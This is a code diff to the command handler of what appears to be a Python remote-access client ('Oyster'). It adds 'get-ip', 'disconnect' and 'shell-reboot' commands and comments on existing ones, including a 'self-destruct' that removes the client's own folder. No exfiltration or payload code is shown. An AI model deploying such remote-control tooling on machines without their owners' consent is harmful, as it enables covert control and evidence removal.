@@ -53,15 +53,33 @@ class Plugin(object):
             client.connected_port = args[1]
             return
 
+        if args[0] == 'get-ip':
+            client.send_data(client.ip_address)
+            return
+
         if args[0] == 'set-ip':
             client.send_data('IP set.')
             client.ip_address = args[1]
             return
 
+        if args[0] == 'disconnect':
+            client.handle_disconnect()
+            return
+
+        # Reboot self
+        if args[0] == 'shell-reboot':
+            client.send_data('confirmed')
+            client.sock.close()
+            lc = LoopController()
+            lc.should_break = True
+            return lc
+
+        # Get the current working directory.
         if args[0] == 'getcwd':
             self.send_data_with_cwd(client, '')
             return
 
+        # Send a `pong` back to the server.
         if args[0] == 'ping':
             client.send_data('pong\n')
             return
@@ -73,6 +91,7 @@ class Plugin(object):
             lc.should_break = True
             return lc
 
+        # Make the `client.py` script remove the `Oyster` folder and its contents.
         if args[0] == 'self-destruct':
             client.server_print('Self-destructing in..', terminate=False)
             client.server_print('5!', terminate=False)
@@ -96,6 +115,7 @@ class Plugin(object):
             self.negotiate_server_shutdown(client)
             return
 
+        # Restart the `client.py` script.
         if args[0] == 'reboot':
             client.send_data('')
             self.reboot(client)
